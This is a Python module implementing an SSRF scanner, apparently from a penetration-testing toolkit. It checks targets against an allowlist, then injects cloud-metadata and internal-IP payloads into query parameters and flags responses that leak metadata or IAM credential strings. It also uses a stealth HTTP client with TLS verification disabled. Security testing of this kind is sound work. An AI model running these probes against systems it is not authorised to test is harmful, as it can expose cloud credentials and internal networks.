"""SSRF (Server-Side Request Forgery) testing tool — pure Python httpx implementation."""

from __future__ import annotations

import re
import time
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx
import structlog
from fastmcp import Context

from tengu.security.allowlist import make_allowlist_from_config
from tengu.security.audit import get_audit_logger
from tengu.security.sanitizer import sanitize_url

logger = structlog.get_logger(__name__)

# Probe timeout per individual request (seconds)
_PROBE_TIMEOUT = 10

# Default parameter names to try when no specific parameter is provided
_SSRF_PARAM_NAMES = ["url", "uri", "link", "redirect", "next", "callback", "src", "host"]

# Strings present in cloud metadata responses — confirms reflected SSRF
_METADATA_INDICATORS = re.compile(
    r"ami-id|instance-id|iam/security-credentials|computeMetadata|"
    r"latest/meta-data|placement/region|access.?key|security-credentials",
    re.IGNORECASE,
)

# Error-text patterns that indicate the server tried to fetch the injected URL
_INTERNAL_INDICATORS = re.compile(
    r"connection refused|refused to connect|ECONNREFUSED|"
    r"127\.0\.0\.1|localhost|failed to connect|cannot connect|"
    r"network error|SSRF|invalid URL scheme",
    re.IGNORECASE,
)

_DEFAULT_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://localhost/",
    "http://10.0.0.1/",
    "http://192.168.0.1/",
]


async def ssrf_tester(
    ctx: Context,  # type: ignore[type-arg]
    target: str,
    payloads: list[str] | None = None,
    parameter: str = "",
    timeout: int = 30,
) -> dict:  # type: ignore[type-arg]
    """Test a URL for Server-Side Request Forgery (SSRF) vulnerabilities.

    Injects SSRF payloads (cloud metadata URLs, internal IP addresses) into
    query parameters and checks the server response for evidence of a
    server-side fetch. Detects two classes of SSRF:

    - Reflected SSRF: response body contains content from the injected URL
      (e.g. AWS metadata strings such as 'ami-id' or 'instance-id').
    - Error-based SSRF: server error message reveals an attempted internal
      fetch (e.g. 'Connection refused to 127.0.0.1').
    - Blind/timeout SSRF: request to an internal IP hangs — the server is
      likely attempting the fetch but getting no response.

    Args:
        target: Target URL to test (with or without existing query parameters).
        payloads: List of URLs to inject. Defaults to cloud metadata endpoints
                  and common internal addresses.
        parameter: Specific query parameter to inject into. If empty, tries
                   common SSRF-prone names (url, uri, link, redirect, next,
                   callback, src, host) or any existing query parameters.
        timeout: Total scan timeout in seconds. Each individual probe uses a
                 per-request timeout of 10 s; the overall scan stops when
                 'timeout' seconds have elapsed.

    Returns:
        SSRF scan results with a findings list. Each finding includes the
        injected payload, matched URL, evidence excerpt, and a curl command
        to reproduce the finding.

    Note:
        - Pure Python / httpx — no subprocess, no external binary required.
        - Blind OOB SSRF (DNS callback) is not detected without an external
          callback server.
        - Target must be in tengu.toml [targets].allowed_hosts.
    """
    audit = get_audit_logger()
    params: dict[str, object] = {
        "target": target,
        "parameter": parameter,
        "timeout": timeout,
    }

    target = sanitize_url(target)

    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("ssrf_tester", target, str(exc))
        raise

    effective_payloads = payloads if payloads else _DEFAULT_PAYLOADS

    # Determine which query parameters to probe
    parsed = urlparse(target)
    existing_params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if parameter:
        params_to_probe = [parameter]
    elif existing_params:
        params_to_probe = existing_params
    else:
        params_to_probe = _SSRF_PARAM_NAMES

    total_probes = len(effective_payloads) * len(params_to_probe)
    await ctx.report_progress(0, total_probes, f"Starting SSRF test on {target}...")
    await audit.log_tool_call("ssrf_tester", target, params, result="started")

    findings: list[dict[str, object]] = []
    finding_keys: set[str] = set()
    probe_keys: set[str] = set()
    probe_count = 0
    scan_start = time.monotonic()

    try:
        from tengu.stealth import get_stealth_layer

        stealth = get_stealth_layer()

        async with stealth.create_http_client(
            follow_redirects=True,
            timeout=_PROBE_TIMEOUT,
            verify=False,
        ) as client:
            for payload in effective_payloads:
                if time.monotonic() - scan_start > timeout:
                    logger.info("ssrf_tester scan timeout reached", target=target)
                    break

                for param_name in params_to_probe:
                    probe_key = f"{param_name}|{payload}"
                    if probe_key in probe_keys:
                        continue
                    probe_keys.add(probe_key)

                    injected_url = _inject_param(target, param_name, payload)
                    curl_cmd = f"curl -sk '{injected_url}'"

                    logger.debug(
                        "ssrf probe",
                        url=injected_url,
                        param=param_name,
                        payload=payload,
                    )

                    t0 = time.monotonic()
                    try:
                        response = await client.get(injected_url)
                        elapsed = time.monotonic() - t0
                        body = response.text[:4000]
                    except httpx.TimeoutException:
                        elapsed = time.monotonic() - t0
                        # Timeout probing an internal/loopback IP is a blind SSRF indicator
                        if _is_internal_payload(payload) and elapsed >= _PROBE_TIMEOUT - 1:
                            _maybe_add_finding(
                                findings,
                                finding_keys,
                                title="Potential Blind SSRF (Connection Timeout)",
                                severity="medium",
                                matched_url=injected_url,
                                description=(
                                    f"The request to {injected_url} timed out after "
                                    f"{elapsed:.1f}s. This may indicate the server attempted "
                                    f"to connect to {payload} and hung — a blind SSRF indicator."
                                ),
                                payload=payload,
                                curl_cmd=curl_cmd,
                                evidence=f"Request timed out after {elapsed:.1f}s",
                                param_name=param_name,
                                blind=True,
                            )
                        probe_count += 1
                        continue
                    except httpx.RequestError as exc:
                        logger.debug("ssrf probe request error", error=str(exc), url=injected_url)
                        probe_count += 1
                        continue

                    probe_count += 1

                    # Reflected SSRF: cloud metadata content in response
                    if _METADATA_INDICATORS.search(body):
                        evidence = _extract_evidence(body, _METADATA_INDICATORS)
                        _maybe_add_finding(
                            findings,
                            finding_keys,
                            title="SSRF — Cloud Metadata Exposure",
                            severity="critical",
                            matched_url=injected_url,
                            description=(
                                f"Server returned cloud metadata content via parameter "
                                f"'{param_name}' when injected with {payload}. "
                                f"The server fetched the metadata endpoint and reflected "
                                f"its contents in the response."
                            ),
                            payload=payload,
                            curl_cmd=curl_cmd,
                            evidence=evidence,
                            param_name=param_name,
                            blind=False,
                        )

                    # Error-based SSRF: server error reveals internal fetch attempt
                    elif _INTERNAL_INDICATORS.search(body) and _is_internal_payload(payload):
                        evidence = _extract_evidence(body, _INTERNAL_INDICATORS)
                        _maybe_add_finding(
                            findings,
                            finding_keys,
                            title="SSRF — Internal Network Access (Error-Based)",
                            severity="high",
                            matched_url=injected_url,
                            description=(
                                f"Server response to parameter '{param_name}' contains error "
                                f"text indicating an attempted fetch to {payload}. "
                                f"The application is likely making a server-side request "
                                f"and leaking connection errors."
                            ),
                            payload=payload,
                            curl_cmd=curl_cmd,
                            evidence=evidence,
                            param_name=param_name,
                            blind=False,
                        )

                    await ctx.report_progress(
                        probe_count, total_probes, f"Tested {probe_count}/{total_probes} probe(s)"
                    )

    except Exception as exc:
        logger.error("ssrf_tester unexpected error", error=str(exc), target=target)
        await audit.log_tool_call(
            "ssrf_tester", target, params, result="failed", error=str(exc)
        )
        return {
            "tool":     "ssrf_tester",
            "target":   target,
            "error":    str(exc),
            "findings": [],
        }

    duration = time.monotonic() - scan_start
    await ctx.report_progress(probe_count, probe_count, "SSRF test complete")
    await audit.log_tool_call(
        "ssrf_tester", target, params, result="completed", duration_seconds=duration
    )

    logger.info(
        "ssrf_tester complete",
        target=target,
        probes=probe_count,
        findings=len(findings),
        duration=round(duration, 2),
    )

    return {
        "tool":             "ssrf_tester",
        "target":           target,
        "duration_seconds": round(duration, 2),
        "probes_sent":      probe_count,
        "findings_count":   len(findings),
        "findings":         findings,
    }


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject_param(url: str, param_name: str, value: str) -> str:
    """Return url with param_name set to value in the query string."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param_name] = [value]
    new_query = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse(parsed._replace(query=new_query))


def _is_internal_payload(payload: str) -> bool:
    """Return True if the payload targets a private or loopback address."""
    return bool(re.search(
        r"169\.254\.|127\.\d+\.\d+\.|0\.0\.0\.0|localhost|\[::1\]|"
        r"10\.\d+\.\d+\.|192\.168\.\d+\.|172\.(1[6-9]|2\d|3[01])\.",
        payload,
    ))


def _extract_evidence(body: str, pattern: re.Pattern) -> str:  # type: ignore[type-arg]
    """Return up to 5 matching lines from body as an evidence excerpt."""
    lines = [line.strip() for line in body.splitlines() if pattern.search(line)]
    return "\n".join(lines[:5]) or body[:200]


def _maybe_add_finding(
    findings: list[dict[str, object]],
    finding_keys: set[str],
    *,
    title: str,
    severity: str,
    matched_url: str,
    description: str,
    payload: str,
    curl_cmd: str,
    evidence: str,
    param_name: str,
    blind: bool,
) -> None:
    """Append finding if not already recorded (dedup by title + param + payload)."""
    key = f"{title}|{param_name}|{payload}"
    if key in finding_keys:
        return
    finding_keys.add(key)
    findings.append({
        "title":       title,
        "severity":    severity,
        "matched_url": matched_url,
        "description": description,
        "payload":     payload,
        "curl_command": curl_cmd,
        "evidence":    evidence,
        "parameter":   param_name,
        "blind":       blind,
    })
    logger.info(
        "ssrf finding",
        title=title,
        severity=severity,
        url=matched_url,
        param=param_name,
        blind=blind,
    )
